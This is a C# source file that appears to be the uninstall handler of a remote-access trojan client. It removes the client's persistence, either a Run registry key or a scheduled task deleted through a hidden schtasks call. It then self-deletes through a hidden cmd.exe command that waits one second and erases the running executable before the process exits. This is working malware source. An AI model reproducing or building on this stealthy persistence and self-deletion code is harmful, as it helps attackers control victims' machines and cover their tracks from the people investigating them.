﻿using Client.Helper;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;

namespace Client.Handle_Packet
{
   public class HandleUninstall
    {
        public HandleUninstall()
        {
                if (Convert.ToBoolean(Settings.Install))
                {
                    try
                    {
                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").DeleteValue(Path.GetFileName(Settings.ClientFullPath));
                    else
                    {
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = "schtasks",
                            Arguments = $"/delete /tn {Path.GetFileName(Settings.ClientFullPath)} /f",
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                    }
                }
                catch { }
                }
                ProcessStartInfo Del = null;
                try
                {
                    Del = new ProcessStartInfo()
                    {
                        Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        FileName = "cmd.exe"
                    };
                }
                catch { }
                finally
                {
                    Methods.CloseMutex();
                    Process.Start(Del);
                    Environment.Exit(0);
                }
        }
    }
}
